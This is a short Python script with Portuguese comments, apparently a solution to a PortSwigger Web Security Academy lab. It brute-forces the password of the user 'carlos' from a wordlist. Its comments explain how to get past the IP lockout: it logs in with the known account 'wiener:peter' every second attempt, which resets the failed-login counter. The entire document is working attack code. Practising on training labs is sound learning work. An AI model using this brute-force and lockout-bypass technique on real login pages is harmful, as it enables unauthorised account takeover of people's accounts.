# A aplicação bloqueia o IP a cada 3 tentativas falhas de login,
# tentar alterar para IPs aleatórios no cabeçalho "X-Forwarded-For" não funciona,
# porém, ao logar em uma conta existente, o contador de falhas de login e zerado.

import requests

url = 'https://0a400037043107c4806e996800000094.web-security-academy.net/login'
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()

for i in range(len(list_pass)):
    if i%2==0:
        data = {
            "username": "wiener",
            "password": "peter"
        }
        response = requests.post(url, headers=headers, data=data)

    data = {
        "username": "carlos",
        "password": list_pass[i]
    }
    response = requests.post(url, headers=headers, data=data)

    if "Incorrect password" in response.text:
        pass
    else:
        print("carlos -> " + list_pass[i])